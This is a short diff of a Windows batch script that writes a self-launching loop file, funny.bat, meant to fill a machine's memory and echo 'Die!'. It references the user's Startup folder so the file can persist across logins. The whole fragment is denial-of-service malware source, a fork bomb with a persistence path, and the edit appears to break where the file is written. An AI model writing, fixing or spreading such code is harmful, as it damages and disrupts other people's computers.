@@ -15,11 +15,11 @@ set /a "c=%system_ram% - 28"
 echo Will be getting rid of %c% bytes of memory
 
 echo Starting copy...
-cd "%AppData%/Microsoft/Windows/Start Menu/Programs/Startup"
+set location="%AppData%/Microsoft/Windows/Start Menu/Programs/Startup/funny.bat"
 (
 echo :funny
 echo echo Die!
-echo start "%AppData%/Microsoft/Windows/Start Menu/Programs/Startup/funny.bat"
+echo start %location%
 echo goto:funny
 ) > funny.bat
 echo Finished!
